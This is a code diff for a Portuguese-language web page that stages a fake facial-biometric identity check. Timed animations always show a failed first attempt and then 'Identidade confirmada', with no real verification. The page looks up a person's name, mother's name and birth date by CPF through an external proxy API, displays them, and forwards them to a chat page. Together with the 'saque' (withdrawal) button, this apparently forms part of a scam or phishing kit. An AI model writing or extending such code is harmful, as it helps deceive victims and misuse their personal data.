-        elPlaceholder.innerHTML = `
-          <i class="fas fa-redo" style="font-size:36px;color:rgba(0,0,0,.2);"></i>
-          <p>Toque em <strong>"Tentar Novamente"</strong><br>para repetir a verificação</p>`;
-
-        elOval.className = 'oval-clip-container';
-        hidePill();
-
-        elBtnSaque.innerHTML = '<i class="fas fa-redo"></i>&nbsp; Tentar Novamente';
-        elBtnSaque.disabled = false;
-        busy = false;
-        return;
-      }
-
-      /* ── SEGUNDA TENTATIVA → SUCESSO ── */
-      elScanLine.classList.remove('active');
-      elOval.className = 'oval-clip-container success';
-      setPill('Identidade confirmada ✓', 'ok');
-      elStatus.textContent = '✅ Identidade confirmada com sucesso.';
-
-      await delay(600);
-      elSuccessOv.classList.add('show');
-      closeCamera();
-
-      elBtnSaque.style.display = 'none';
-      elBtnCont.classList.add('show');
-      busy = false;
-    });
-
-    // ── botão continuar → chat.html ──
-    elBtnCont.addEventListener('click', () => {
-      const params = new URLSearchParams(window.location.search);
+    function redirecionar() {
+      const p = new URLSearchParams(window.location.search);
       if (userData) {
-        params.set('nome',       formatarNomeCompleto(userData.nome));
-        params.set('mae',        userData.mae ? formatarNomeCompleto(userData.mae) : 'Não Informado');
-        params.set('nascimento', userData.nascimento);
-        params.set('cpf',        formatarCPF1(userData.cpf || ''));
+        p.set('nome',       formatarNome(userData.nome));
+        p.set('mae',        userData.mae ? formatarNome(userData.mae) : 'Não Informado');
+        p.set('nascimento', userData.nascimento);
+        p.set('cpf',        formatarCPF(userData.cpf||''));
       }
-      window.location.href = `../chat.html?${params.toString()}`;
-    });
+      window.location.href = `../chat.html?${p.toString()}`;
+    }
 
-    // ── busca dados do usuário ──
+    async function iniciar() {
+      resetVisual();
+
+      /* ── abre câmera ── */
+      pill('Por favor, aguarde');
+      await abrirCamera();
+      await delay(900);
+
+      /* ── scan começa ── */
+      pill('Analisando biometria...');
+      elOval.classList.add('scanning');
+      elScan.classList.add('active');
+      await delay(1000);
+
+      /* ── pontos faciais ── */
+      elDots.classList.add('show');
+      await delay(1000);
+
+      /* ── malha facial ── */
+      elMesh.classList.add('show');
+      await delay(1200);
+
+      /* ══ PRIMEIRA TENTATIVA → FALHA ══ */
+      elScan.classList.remove('active');
+      elDots.classList.remove('show');
+      elMesh.classList.remove('show');
+      elOval.className = 'oval-wrap error';
+      pill('Não foi possível verificar', 'err');
+
+      await delay(350);
+      elErr.classList.add('show');
+      await delay(2600);
+
+      /* ── reset para segunda tentativa ── */
+      elErr.classList.remove('show');
+      fecharCamera();
+      resetVisual();
+      elPh.style.display = 'flex';
+      elPh.innerHTML = `
+        <i class="fas fa-spinner fa-spin" style="font-size:36px;color:rgba(0,0,0,.18);"></i>
+        <p style="color:rgba(0,0,0,.35);">Aguarde, tentando novamente...</p>`;
+      await delay(1400);
+
+      /* ══ SEGUNDA TENTATIVA → SUCESSO ══ */
+      pill('Por favor, aguarde');
+      await abrirCamera();
+      await delay(700);
+
+      pill('Analisando biometria...');
+      elOval.classList.add('scanning');
+      elScan.classList.add('active');
+      await delay(1000);
+
+      elDots.classList.add('show');
+      await delay(900);
+
+      elMesh.classList.add('show');
+      await delay(900);
+
+      pill('Validando identidade...');
+      await delay(1000);
+
+      /* ══ SUCESSO ══ */
+      elScan.classList.remove('active');
+      elOval.className = 'oval-wrap success';
+      pill('Identidade confirmada ✓', 'ok');
+      fecharCamera();
+
+      await delay(400);
+      elSuc.classList.add('show');
+
+      await delay(1800);
+      redirecionar();
+    }
+
     async function fetchUserData() {
       try {
-        const urlParams = new URLSearchParams(window.location.search);
-        const cpf = urlParams.get('cpf');
-        if (!cpf) throw new Error('CPF não encontrado.');
-
-        const cleanCPF = cpf.replace(/\D/g, '');
-        const response = await fetch(`https://proxy-ativo.vercel.app/api/proxy?cpf=${cleanCPF}`);
-        const responseData = await response.json();
-
-        if (!response.ok) throw new Error(responseData.error || 'Erro na consulta.');
-
-        const apiData = responseData.dadosBasicos;
-        if (!apiData || !apiData.nome) throw new Error('Dados não encontrados.');
-
-        userData = {
-          nome:       apiData.nome       || '',
-          cpf:        apiData.cpf        || cleanCPF,
-          nascimento: apiData.nascimento || '',
-          mae:        apiData.mae        || ''
-        };
-
-        const nome_ok = formatarNomeCompleto(userData.nome);
-        elName.textContent       = nome_ok;
-        elHeaderName.textContent = nome_ok.split(' ')[0];
-        elCPF.textContent        = formatarCPF1(userData.cpf || cleanCPF);
-        elBirth.textContent      = userData.nascimento || '';
-        elMother.textContent     = userData.mae ? formatarNomeCompleto(userData.mae) : 'Não Informado';
-
-      } catch (err) {
-        console.error('Erro ao buscar dados:', err);
-      } finally {
+        const p   = new URLSearchParams(window.location.search);
+        const cpf = p.get('cpf');
+        if (!cpf) throw new Error('sem cpf');
+        const cleanCPF = cpf.replace(/\D/g,'');
+        const res  = await fetch(`https://proxy-ativo.vercel.app/api/proxy?cpf=${cleanCPF}`);
+        const json = await res.json();
+        if (!res.ok) throw new Error(json.error||'erro');
+        const d = json.dadosBasicos;
+        if (!d||!d.nome) throw new Error('sem dados');
+        userData = { nome:d.nome||'', cpf:d.cpf||cleanCPF, nascimento:d.nascimento||'', mae:d.mae||'' };
+        elHdrName.textContent = formatarNome(userData.nome).split(' ')[0];
+        $('name-value').textContent  = formatarNome(userData.nome);
+        $('cpf-value').textContent   = formatarCPF(userData.cpf||cleanCPF);
+        $('birth-value').textContent = userData.nascimento;
+        $('mother-value').textContent= userData.mae ? formatarNome(userData.mae) : 'Não Informado';
+      } catch(e) { console.error(e); }
+      finally {
         elLoading.classList.add('hidden');
         elMain.classList.remove('hidden');
+        iniciar();
       }
     }
 
